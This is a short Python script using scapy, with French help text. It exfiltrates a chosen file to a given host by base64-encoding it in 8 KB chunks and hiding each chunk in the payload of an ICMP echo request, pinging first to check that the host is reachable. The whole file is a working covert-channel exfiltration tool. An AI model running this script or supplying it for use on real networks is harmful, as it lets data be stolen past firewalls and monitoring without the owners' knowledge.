import base64
import argparse
from scapy.all import *

parser = argparse.ArgumentParser(description="exfiltration de fichiers")
parser.add_argument('-a','--address', help='adresse du serveur auquel envoyer le fichier',dest='ip',type=str)
parser.add_argument('-f','--file', help='nom du fichier à envoyer',dest='file',type=str)

args = parser.parse_args()
fichier=args.file
if not args.ip or not args.file:
    parser.print_help()
    exit(1)
filename = args.file

with open(filename, "rb") as f:
    while True:
        ok=False
        while not ok:
          packet=IP(dst=args.ip)/ICMP(type=8)/Raw('test')
          resp=sr1(packet)
          if resp:
              ok=True
        bytes_read = f.read(8192)
        if not bytes_read:
            break

        b64_payload = base64.b64encode(bytes_read)
        packet=IP(dst=args.ip)/ICMP(type=8)/Raw(b64_payload)
        send(packet,count=1)
